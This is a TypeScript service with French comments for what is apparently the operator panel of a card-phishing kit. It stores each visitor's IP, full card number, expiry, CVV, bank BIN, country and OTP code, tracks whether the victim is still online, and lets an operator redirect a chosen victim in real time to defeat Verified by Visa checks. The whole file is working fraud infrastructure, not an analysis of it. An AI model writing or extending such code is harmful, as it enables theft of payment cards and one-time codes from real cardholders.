/**
 * Service pour la gestion des clients sur la page VBV
 */

interface VBVClient {
  visitId: string;
  ip: string;
  page: string;
  fullName: string;
  cardInfo: {
    cardholder: string;
    cardNumber: string;
    expiry: string;
    cvv: string;
  };
  /** BIN formaté pour rappel (ex: "457896 (VISA - FIRSTRAND BANK, LTD.)") */
  binDisplay?: string;
  /** Pays pour rappel (ex: "SOUTH AFRICA") */
  country?: string;
  otpCode?: string;
  lastActivity: number;
  isOnline: boolean;
}

class VBVPanelService {
  private clients = new Map<string, VBVClient>();
  private redirectRequests = new Map<string, string>(); // visitId -> redirectTo
  private readonly HEARTBEAT_TIMEOUT = 120000; // 2 min sans heartbeat = hors ligne (client envoie toutes les 5s)
  // Le client n'est retiré que lorsqu'il ferme la fenêtre (appel à removeClient via /api/vbv-panel/leave)

  /**
   * Enregistre ou met à jour un client sur la page VBV
   */
  upsertClient(data: {
    visitId: string;
    ip: string;
    fullName?: string;
    cardInfo?: {
      cardholder: string;
      cardNumber: string;
      expiry: string;
      cvv: string;
    };
    binDisplay?: string;
    country?: string;
    otpCode?: string;
    page?: string;
  }): VBVClient {
    const now = Date.now();
    const existing = this.clients.get(data.visitId);

    // Déterminer la page : utiliser celle fournie, ou celle existante, ou "Payment Verification" par défaut
    let page = "Payment Verification";
    if (data.page) {
      page = data.page;
    } else if (existing?.page) {
      page = existing.page;
    }

    const client: VBVClient = {
      visitId: data.visitId,
      ip: data.ip,
      page: page,
      fullName: data.fullName || existing?.fullName || "",
      cardInfo: data.cardInfo || existing?.cardInfo || {
        cardholder: "",
        cardNumber: "",
        expiry: "",
        cvv: "",
      },
      binDisplay: data.binDisplay !== undefined ? data.binDisplay : existing?.binDisplay,
      country: data.country !== undefined ? data.country : existing?.country,
      // Mettre à jour le code OTP si fourni, sinon garder l'existant
      otpCode: data.otpCode !== undefined ? data.otpCode : existing?.otpCode,
      lastActivity: now,
      isOnline: true,
    };

    this.clients.set(data.visitId, client);
    console.log(`[VBV Service] Client upserted: ${data.visitId.substring(0, 12)}... (Page: ${page}, Total clients: ${this.clients.size})`);
    return client;
  }

  /**
   * Met à jour le heartbeat d'un client
   * Si le client n'existe pas encore, le crée avec des données minimales
   */
  updateHeartbeat(visitId: string, ip?: string): boolean {
    let client = this.clients.get(visitId);
    
    // Si le client n'existe pas encore, le créer avec des données minimales
    if (!client && ip) {
      client = {
        visitId,
        ip,
        page: "VBV",
        fullName: "",
        cardInfo: {
          cardholder: "",
          cardNumber: "",
          expiry: "",
          cvv: "",
        },
        lastActivity: Date.now(),
        isOnline: true,
      };
      this.clients.set(visitId, client);
      console.log(`[VBV Service] Client created via heartbeat: ${visitId.substring(0, 12)}... (Total clients: ${this.clients.size})`);
      return true;
    }
    
    if (!client) {
      return false;
    }

    client.lastActivity = Date.now();
    client.isOnline = true;
    return true;
  }

  /**
   * Récupère tous les clients, avec mise à jour du statut en ligne.
   * Les clients ne sont pas retirés automatiquement : uniquement à la fermeture de la fenêtre (leave).
   */
  getAllClients(): VBVClient[] {
    const now = Date.now();

    // Mettre à jour uniquement le statut en ligne (sans retirer les clients)
    for (const client of Array.from(this.clients.values())) {
      const timeSinceLastActivity = now - client.lastActivity;
      client.isOnline = timeSinceLastActivity < this.HEARTBEAT_TIMEOUT;
    }

    const allClients = Array.from(this.clients.values())
      .sort((a, b) => b.lastActivity - a.lastActivity);

    if (allClients.length > 0) {
      console.log(`[VBV Service] getAllClients: ${allClients.length} clients (${allClients.filter(c => c.isOnline).length} online)`);
    }
    return allClients;
  }

  /**
   * Récupère un client par visitId
   */
  getClient(visitId: string): VBVClient | undefined {
    const client = this.clients.get(visitId);
    if (client) {
      const now = Date.now();
      const timeSinceLastActivity = now - client.lastActivity;
      client.isOnline = timeSinceLastActivity < this.HEARTBEAT_TIMEOUT;
    }
    return client;
  }

  /**
   * Supprime un client (quand il quitte la page)
   */
  removeClient(visitId: string): boolean {
    return this.clients.delete(visitId);
  }

  /**
   * Nettoie les clients inactifs (optionnel, pour libérer la mémoire)
   */
  cleanupInactiveClients(maxAge = 3600000): void {
    const now = Date.now();
    for (const [visitId, client] of Array.from(this.clients.entries())) {
      if (now - client.lastActivity > maxAge) {
        this.clients.delete(visitId);
      }
    }
  }

  /**
   * Demande une redirection pour un client
   */
  requestRedirect(visitId: string, redirectTo: string): boolean {
    if (!this.clients.has(visitId)) {
      return false;
    }
    this.redirectRequests.set(visitId, redirectTo);
    return true;
  }

  /**
   * Récupère et consomme la demande de redirection pour un client
   */
  getAndConsumeRedirect(visitId: string): string | null {
    const redirectTo = this.redirectRequests.get(visitId);
    if (redirectTo) {
      this.redirectRequests.delete(visitId);
      return redirectTo;
    }
    return null;
  }
}

export const vbvPanelService = new VBVPanelService();
